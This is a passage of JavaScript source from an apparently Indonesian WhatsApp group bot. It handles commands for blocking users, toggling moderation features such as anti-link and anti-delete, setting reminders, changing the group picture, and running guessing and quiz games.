if(Nomer === ownerNumber[0]) return setReply("Ga mau")
await xdev.blockUser(Nomer, "add")
await addBlock(Nomer, blocked)
await setReply( `Berhasil block ${Nomer.split("@")[0]}`);
    
 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
await xdev.blockUser(ahah, "add")
await addBlock(ahah, blocked)
await setReply(`${ahah.split("@")[0]} berhasil di block`);
   } else{
 setReply(`Kirim perintah ${prefix}block @tag atau nomor atau reply pesan orang yang ingin di block`)
 }
break    


case 'unblock':
	if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}kick +62xxx 1h`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke === ownerNumber[0]) return setReply("Ga mau")
await xdev.blockUser(woke, "remove")
await unBlock(woke, blocked)
await setReply( `Sukses unblock ${woke.split("@")[0]}`);
    
} else if (dev.message.extendedTextMessage.contextInfo.participant) {
if (!isGroup) return setReply("Hanya bisa di group")
asu = dev.message.extendedTextMessage.contextInfo.participant
Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
if(Nomer === ownerNumber[0]) return setReply("Ga mau")
await xdev.blockUser(Nomer, "remove")
await unBlock(Nomer, blocked)
await setReply( `Berhasil unblock ${Nomer.split("@")[0]}`);
    
 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
await xdev.blockUser(ahah, "remove")
await unBlock(ahah, blocked)
await setReply(`${ahah.split("@")[0]} berhasil di unblock`);
   } else{
 setReply(`Kirim perintah ${prefix}unblock @tag atau nomor atau reply pesan orang yang ingin di block`)
 }
break    



    
    case 'setwelcome':
    if ((args[0]) === 'type1' ) {
    if(xdev.welcome === "type1") return setReply("Udah aktif")
    xdev.welcome = "type1"
    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
    } else if ((args[0]) === 'type2' ) {
    if(xdev.welcome === "type2") return setReply("Udah aktif")
    xdev.welcome = "type2"
    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
    } else if ((args[0]) === 'type3' ) {
   if(xdev.welcome === "type3") return setReply("Udah aktif")
    xdev.welcome = "type3"
    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
    } else if ((args[0]) === 'type4' ) {
   if(xdev.welcome === "type4") return setReply("Udah aktif")
    xdev.welcome = "type4"
    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
    } else if(!q){
    setReply("Pilih setwelcome : type1 atau type2 atau type3")
    } else {
    setReply("Query tidak di temukan")
    }
    break
    
    
   
    
    
    case 'welcome':
    if (!isGroupAdmins) return sendSticker(hanyaadmin)
                    if(isExtream) return
					if (!isGroup) return setReply('hanya bisa di group')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isWelkom) return setReply('Fitur welcome sudah aktif kak')
						welkom.push(from)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						let ih =`Fitur welcome telah aktif`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isWelkom) return setReply('Udah mati')
						welkom.splice(from, 1)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						let ih =`Fitur welcome telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE WELCOME`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}welcome on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}welcome off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;                 


case 'umur':
if(!q) return setReply("Masukan tanggal lahir kamu")
datuk = calculate_age(q)
setReply(`Umur kamu saat ini adalah ${datuk}`)
break



                 
                 case 'antidel':
                 case 'antidelete':
    if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
                    if(isExtream) return
					if (!isGroup) return setReply('hanya bisa di group')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isAntidel) return setReply('Sudah aktif kak')
						xdev.antidel.push(from)
						//fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidel))
						let ih =`Fitur anti delete telah aktif`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isAntidel) return setReply('Udah mati')
						xdev.antidel.splice(from, 1)
						//fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidel))
						let ih =`Fitur anti delete telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI DELETE`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antidel on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antidel off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
      case 'antilinkgc':
      if (!isGroupAdmins) return sendSticker(hanyaadmin)
					if (!isGroup) return setReply('hanya bisa di group')
					if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
						addDataId(from, command, DataId)
						let ih =`Fitur antilink group telah di aktifkan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isAntilinkGc) return setReply('Udah mati')
						removeDataId (command, from, DataId)
						let ih =`Fitur antilink group telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI LINK GROUP`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antilinkgc on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
    
    
    
    
 
    

       
       
         




					
					
					case "antivirtex":
	    if(isExtream) return
		if (!isGroupAdmins) return sendSticker(hanyaadmin)
        if (!isGroup) return setReply('Kusus group')
        if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
        if (AntiVirtex) return setReply('Sudah Aktif')
          addDataId(from, command, DataId)
          setReply("Sukses mengaktifkan antivirtex!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        if (!AntiVirtex) return setReply('Sudah Mati')
          removeDataId (command, from, DataId)
          setReply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        
        


  
  	
        
        
        
        
        
        case "antiasing":
      if (!isGroup) return setReply('Kusus group')
if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
			if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
          if (isKickarea) return setReply("Sudah aktif!!");
          addDataId(from, command, DataId)
          setReply("Sukses mengaktifkan kickarea!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
    	 if (!isKickarea) return setReply("Udah off!!");
          removeDataId (command, from, DataId)
          setReply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
					
					
					
					
					
					



    
    
    
    
    case 'getppgc':
					if (!isGroup) return 
					setReply(mess.wait)
					ahenak = from
		if (`${ahenak}@g.us`) {
		try {
					ppimg = await xdev.getProfilePicture(ahenak)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				metadete = await xdev.groupMetadata(ahenak)
				uh = await xdev.getProfilePicture(ahenak)
				buffer = await getBuffer(uh)
				xdev.sendMessage(from, buffer, image, {quoted: dev})
		} 
  break
  
  
									
									
									
									case 'sewacheck': case 'ceksewa':  case 'sewacek':
									if (!isGroup) return setReply(mess.only.group)
									if (!_sewa.checkSewaGroup(from, sewa)) return setReply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
									let cekid = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
									let sewenye = `「 *SEWA EXPIRE* 」
*Group*: ${groupName}
*ID*: ${from}
*EXPIRE :* ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik`
									setReply(sewenye)
									break
									
    
    
             
    
    
    
    case 'infogc':
           case 'infogrup':
            case 'infogroup':
            case 'grupinfo':
            case 'groupinfo':
                if (!isGroup) return setReply('Hanya bisa di dalam group')
                 
                try {
                    var pic = await xdev.getProfilePicture(from)
                } catch {
                    var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                }
                
                let ingfo = `
*G R O U P I N F O*
*Name :* ${groupName}
*ID Grup :* ${from}
*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
*Jumlah Admin :* ${groupAdmins.length}
*Jumlah Peserta :* ${groupMembers.length}
*AntiLink :* ${isAntiLink ? 'ON' : 'OFF'}
*AntiViewOnce :* ${isAntiviewonce ? 'ON' : 'OFF'}
*AntiBadword :* ${Toxic ? 'ON' : 'OFF'}
*Antibuggc :* ${Antibuggc ? 'ON' : 'OFF'}
*Antiasing :* ${isKickarea ? 'ON' : 'OFF'}
*Antivirtex :* ${AntiVirtex ? 'ON' : 'OFF'}
*Desc :* \n${groupMetadata.desc}`
                xdev.sendMessage(from, ingfo, text, {
                    'contextInfo': {  
                        'text': '🔥',
                        'forwardingScore': 10000000,
                        'isForwarded': true,
                        'sendEphemeral': true,
                        'externalAdReply': {
                            'title':`${groupName}`,
                            'body': '',
                            'previewType': 'PHOTO',
                           
                            'thumbnail': await getBuffer(pic),
                            'sourceUrl': ''
                        }
                    }
             })
                break
           
                            
                          
           case 'getidgc':
           if(!isGroup) return setReply("Hanya bisa di group")
           setReply(`${from}`)
           break
    
    case "reminder": // by Slavyan
        if (!q)
         return setReply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );

        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await xdev.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Text
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              xdev.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(dev).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await xdev.downloadAndSaveMediaMessage(encmedia);
          await xdev.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Sticker
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              xdev.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              xdev.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : dev;
          media = await xdev.downloadAndSaveMediaMessage(encmedia);
          await xdev.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Image
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              teks = `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              xdev.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(dev).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await xdev.downloadAndSaveMediaMessage(encmedia);
          await xdev.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Audio
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              xdev.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              xdev.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;
           
    
    
       //------------------< Enable / Disable >-------------------
            case 'antibadword':
            case 'antitoxic':
                 if(isExtream) return
                if (!isGroup) return setReply('Hanya bisa di group')
                if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                    if (Toxic) return setReply(`Udah aktif`)
                    addDataId(from, command, DataId)
					setReply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                    removeDataId (command, from, DataId)
                    setReply('antibadword grup nonaktif')
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI BADWORD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antibadword on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antibadword off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
    
    
    
    
    
    
    
    
    
    
    case 'setppgrup': 
    case 'setppgc':
									if (!isGroup) return setReply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
									if (!isBotGroupAdmins) return setReply(`Jadikan Bot Sebagai Admin Group!`)
									if (isQuotedImage) {
										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
										let media = await xdev.downloadMediaMessage(encmedia)
										xdev.updateProfilePicture(from, media)
										
										} else if (isQuotedSticker){
											if (dev.message.videoMessage) return setReply('Error Bro Wkwkwk')
											encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
											media = await xdev.downloadAndSaveMediaMessage(encmedia)
											ran = getRandom('.png')
											exec(`ffmpeg -i ${media} ${ran}`, (err) => {
												fs.unlinkSync(media)
												if (err) return setReply('Eror Lord')
												buffer = fs.readFileSync(ran)
												xdev.updateProfilePicture(from, buffer)
												fs.unlinkSync(ran)
												})
											} else {
												setReply(`Kirim atau tag gambar dengan caption ${prefix + command}`)
											}
									break
    
    
    
    

    
    
    case 'caklontong': case 'ckl':{
                    if (!isGroup) return setReply(mess.only.group)
                    if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                    if (game.isCkl(from, caklontong)) return setReply(`Masih ada soal yang belum di selesaikan`)
                    data = fs.readFileSync('./lib/game/caklontong.js');
				    jsonData = JSON.parse(data);
				    randIndex = Math.floor(Math.random() * jsonData.length);
				    randKey = jsonData[randIndex];
                    const petunjuk = randKey.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    setReply(`*JAWABLAH SOAL BERIKUT*\n\nSoal : ${randKey.result.soal}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
                    let ikasayank = randKey.result.jawaban.toLowerCase()
                    deskripsi = randKey.result.desc
                    caklontong1.push(deskripsi)
                    game.addckl(from, ikasayank, gamewaktu, caklontong)
                    gameAdd(senderNumber, user)
                     }
                    break
    
    
    
    
    case 'family100':{
                      if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                      if (!isGroup) return setReply(mess.only.group)
                      if (game.isfam(from, family100)) return setReply(`Masih ada soal yang belum di selesaikan`)
                      data = fs.readFileSync('./lib/game/family100.js');
				      fami = JSON.parse(data);
				      ly100 = Math.floor(Math.random() * fami.length);
				      randKey = fami[ly100];
				      Pertanyaan = randKey.result.soal
                      setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${Pertanyaan}\n*Total Jawaban :* ${randKey.result.jawaban.length }\n\nWaktu : ${gamewaktu} detik`)
                      let anoh = randKey.result.jawaban
                      let rgfds = []
                      for (let i of anoh){
                      let fefs = i.split('/') ? i.split('/')[0] : i
                      let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
                      let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
                      rgfds.push(axsf.toLowerCase())
                        }
                       game.addfam(from, rgfds, gamewaktu, family100)
                       gameAdd(senderNumber, user)
                         }
                         break
    
    
    

           case 'tebakbendera': case 'tb':{
                     if (!isGroup) return setReply(mess.only.group)
                     if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                     if (game.isTebakBendera(from, tebakbendera)) return setReply(`Masih ada soal yang belum di selesaikan`)
                    data = fs.readFileSync('./lib/game/tebakbendera.js');
				    jsonData = JSON.parse(data);
				    randIndex = Math.floor(Math.random() * jsonData.length);
				    randKey = jsonData[randIndex];
                    const petunjuk = randKey.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    setReply(`*JAWABLAH SOAL BERIKUT*\n\nSoal : Bendera negara manakah itu ${randKey.bendera}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
                    let ikasayank = randKey.jawaban.toLowerCase()
                    game.addbendera(from, ikasayank, gamewaktu, tebakbendera)
                    gameAdd(senderNumber, user)
                     }
                    break
          
           
           
           case 'tebakgambar':{
                  if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                  if (!isGroup) return setReply(mess.only.group)
                  setReply(mess.wait)
                  if (game.isTebakGambar(from, tebakgambar)) return setReply(`Masih ada soal yang belum di selesaikan`)
                 data = fs.readFileSync('./lib/game/tebakgambar.js');
				  jsonData = JSON.parse(data);
				  randIndex = Math.floor(Math.random() * jsonData.length);
				  randKey = jsonData[randIndex];
                  const petunjuk = randKey.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                  sendMediaURL(from, randKey.result.soalImg,`Silahkan jawab soal berikut ini\n\nPetunjuk : ${petunjuk}\nWaktu : ${gamewaktu} detik`, dev)
                  let anih = randKey.result.jawaban.toLowerCase()
                  game.addgambar(from, anih, gamewaktu, tebakgambar)
                  gameAdd(senderNumber, user)
	               }
                   break  	 
           
           
           case 'tebaklirik': case 'tl':{
                      if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                      if (!isGroup) return setReply(mess.only.group)
                      if (game.isTebakLirik(from, tebaklirik)) return setReply(`Masih ada soal yang belum di selesaikan`)
                     data = fs.readFileSync('./lib/game/tebaklirik.js');
				      jsonData = JSON.parse(data);
				      randIndex = Math.floor(Math.random() * jsonData.length);
				      randKey = jsonData[randIndex];      
                      const petunjuk = randKey.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                      setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.result.question}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
                      let anal = randKey.result.answer.toLowerCase()
                      game.addtebaklirik(from, anal, gamewaktu, tebaklirik)
                      gameAdd(senderNumber, user)
                        }
                      break 
           
           case 'siapaaku': case 'siapakahaku': case 'sa':{
                     if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                     if (!isGroup) return setReply(mess.only.group)
                     if (game.isTebakGambar(from, tebakgambar)) return setReply(`Masih ada soal yang belum di selesaikan`)
                     data = fs.readFileSync('./lib/game/siapaaku.js');
				      jsonData = JSON.parse(data);
				      randIndex = Math.floor(Math.random() * jsonData.length);
				      randKey = jsonData[randIndex];
                     setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.data.soal}\n\nWaktu : ${gamewaktu}s`)
                     let anau = randKey.data.jawaban.toLowerCase()
                     game.addsyiko(from, anau, gamewaktu, siapaaku)
                     gameAdd(senderNumber, user)
                      }
                     break
           
           
           case 'tebakanime2':
try{
                    if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                    if (!isGroup) return setReply("Hanya bisa di group")
                    if (game.isTebakAnime(from, tebakanime)) return setReply(`Masih ada soal yang belum di selesaikan`)
                    setReply(mess.wait)
                    pin = await hx.pinterest(karakter)
                    ac = pin[Math.floor(Math.random() * pin.length)]
            
            
                    penunjuk = karakter.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    sendMediaURL(from, ac, `Silahkan tebak nama karakter anime berikut ini\n\nPetunjuk : ${penunjuk}\n\nWaktu : ${gamewaktu} detik`, dev)
                    asi = karakter.toLowerCase()
                    game.addanime(from, asi, gamewaktu, tebakanime)
            
            

               } catch (err){
					
                    data = fs.readFileSync('./lib/game/tebakanime.js');
				    jsonData = JSON.parse(data);
			        randIndex = Math.floor(Math.random() * jsonData.length);
			        randKey = jsonData[randIndex];                                        
                    petunjuk = randKey.hasil.nama.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    sendMediaURL(from, randKey.hasil.image, `Silahkan tebak nama karakter anime berikut ini\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`, dev)
                    nurulsayank = randKey.hasil.nama.toLowerCase()
                    game.addanime(from, nurulsayank, gamewaktu, tebakanime)              
		            }
					gameAdd(senderNumber, user)
            break
           
           
           
           
           
           
           
           case 'tebakanime': case 'ta':{
                    if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                    if (!isGroup) return setReply("Hanya bisa di group")
                    setReply(mess.wait)
                    if (game.isTebakAnime(from, tebakanime)) return setReply(`Masih ada soal yang belum di selesaikan`)
                    data = fs.readFileSync('./lib/game/tebakanime.js');
				    jsonData = JSON.parse(data);
			        randIndex = Math.floor(Math.random() * jsonData.length);
			        randKey = jsonData[randIndex];                                        
                    const petunjuk = randKey.hasil.nama.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    sendMediaURL(from, randKey.hasil.image,`Silahkan tebak nama karakter anime berikut ini\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`,  dev)
                    let nurulsayank = randKey.hasil.nama.toLowerCase()
                    game.addanime(from, nurulsayank, gamewaktu, tebakanime)
                    gameAdd(senderNumber, user)
                    }
                    break
           
           
           
           
           
           
          
           
           case 'math':{
                       if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                       if (!isGroup) return setReply(mess.only.group)
                       if (game.isMtk(from, mtk)) return setReply(`Masih ada soal yang belum di selesaikan`)
                       if (!q) return setReply(`*Mode tersedia :*\n1. very_easy\n2. easy\n3. medium\n4. hard\n5. extreme\n6. impossible\n\n_Example : ${prefix + command} hard_`)
                        anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=${q}&apikey=GSdohIiH`)
                       setReply(`*Soal :*\n_${anu.data.nilai_1} ${anu.data.tanda} ${anu.data.nilai_2} :_\nWaktu : ${gamewaktu}detik`)
                       let anih = anu.data.jawaban.toLowerCase()
                       game.addmtk(from, anih, gamewaktu, mtk)
                       gameAdd(senderNumber, user)
                       }
                       break
           
           
           case 'tebakkata': case 'tk':{
                   if (!isGroup) return setReply(mess.only.group)
                   if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                   if (game.isTebakKata(from, tebakkata)) return setReply(`Masih ada soal yang belum di selesaikan`)          
                   data = fs.readFileSync('./lib/game/tebakkata.js');
				      jsonData = JSON.parse(data);
				      randIndex = Math.floor(Math.random() * jsonData.length);
				      randKey = jsonData[randIndex];
                   
                   setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.result.acak}\n\nTipe: ${randKey.result.tipe}\n\nWaktu : ${gamewaktu} detik`)
                   let ahhh = randKey.result.jawaban.toLowerCase()
                   game.addkata(from, ahhh, gamewaktu, tebakkata)
                   gameAdd(senderNumber, user)
                    }
                   break
           
           
           

        
      case 'wait': case 'whatanime':{
                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (isImage || isQuotedImage) {
